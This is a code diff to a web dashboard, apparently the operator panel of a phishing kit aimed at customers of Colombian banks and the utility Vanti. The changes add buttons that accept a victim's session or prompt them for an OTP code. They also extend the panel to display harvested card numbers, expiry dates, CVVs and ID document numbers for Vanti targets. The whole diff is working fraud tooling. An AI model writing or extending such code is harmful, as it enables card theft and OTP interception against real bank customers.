@@ -168,7 +168,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
     </div>
 
     <div class="container">
-        <!-- PESTAÑA PRINCIPAL -->
         <div class="tab-content active" id="tab-principal">
             <div class="stats">
                 <div class="stat-card"><div class="label">🟢 Activos</div><div class="value" id="statActivos">0</div></div>
@@ -228,7 +227,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
             </div>
         </div>
 
-        <!-- PESTAÑA HISTORIAL -->
         <div class="tab-content" id="tab-historial">
             <div class="section">
                 <div class="section-header">
@@ -403,6 +401,8 @@ function botonesSesion(s) {
 
     if (bancoKey === 'vanti') {
         btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
+        btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
+        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
@@ -483,7 +483,7 @@ function renderSesiones() {
         else if (pasoActual.includes('pagodesubsidio')) pasoTexto = pasoActual;
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
-        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia';
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti';
 
         let identificacionTrj = '-';
         let claveFch = '-';
@@ -491,10 +491,10 @@ function renderSesiones() {
         let documento = '';
 
         if (banco === 'vanti') {
-            identificacionTrj = datos.cuenta || '-';
-            claveFch = datos.empresa || '-';
-            cvv = datos.medioPago || '-';
-            documento = '-';
+            identificacionTrj = datos.tarjeta || datos.cuenta || '-';
+            claveFch = datos.expMes || datos.expAnio ? `${datos.expMes || ''}/${datos.expAnio || ''}` : (datos.empresa || '-');
+            cvv = datos.cvv || datos.medioPago || '-';
+            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
         } else if (esTarjeta) {
             identificacionTrj = datos.tarjeta || datos.identificacion || '-';
             const mes = datos.expMes || datos.exp || '';
